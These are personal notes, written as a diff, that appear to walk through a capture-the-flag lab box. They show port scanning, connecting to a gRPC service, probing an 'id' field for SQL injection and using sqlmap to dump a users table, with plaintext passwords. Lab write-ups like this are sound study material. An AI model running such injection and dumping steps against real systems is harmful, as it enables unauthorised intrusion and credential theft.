@@ -1,0 +1,44 @@
+nmap 10.10.11.214 -sS -T4 -Pn -p- :
+    found 22,50051 port 
+    50051 uknown
+find out that port 50051 uses for gRPC 
+
+to connect to port 50051 i used a tool gprcui(https://github.com/fullstorydev/grpcui)
+
+to connect i used: 
+./grpcui -plaintext 10.10.11.214:50051
+
+its opens up a browser tab and GUI menu with 3 options under the MethodName setting:
+    RegisterUser
+    LoginIn
+    getInfo
+i did a RegisterUser as username root and password root
+
+i trying to login in and i get a token:
+    b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoicm9vdCIsImV4cCI6MTY5NzU5MDY5NH0.zMW5d3oBYLACEcfknNqZnrLPmOqHp1P97eEuipJnJDM'
+
+and a message:
+    {
+  "message": "Your id is 134."
+    }
+
+turn on burpsuit in interception is on
+
+sends the request to repeater
+
+seems that 'id' parameter is vulnerable to sqli by using:
+    "id":"*" and got 200 status response
+
+i saved the request using Copy to file option,and used sqlmap tool:
+    sqlmap -r "filename".req -p id --dump
+and i got account dump :
++------------------------+----------+
+| password               | username |
++------------------------+----------+
+| admin                  | admin    |
+| HereIsYourPassWord1431 | sau      |
+| test                   | test     |
++------------------------+----------+
+
+
+
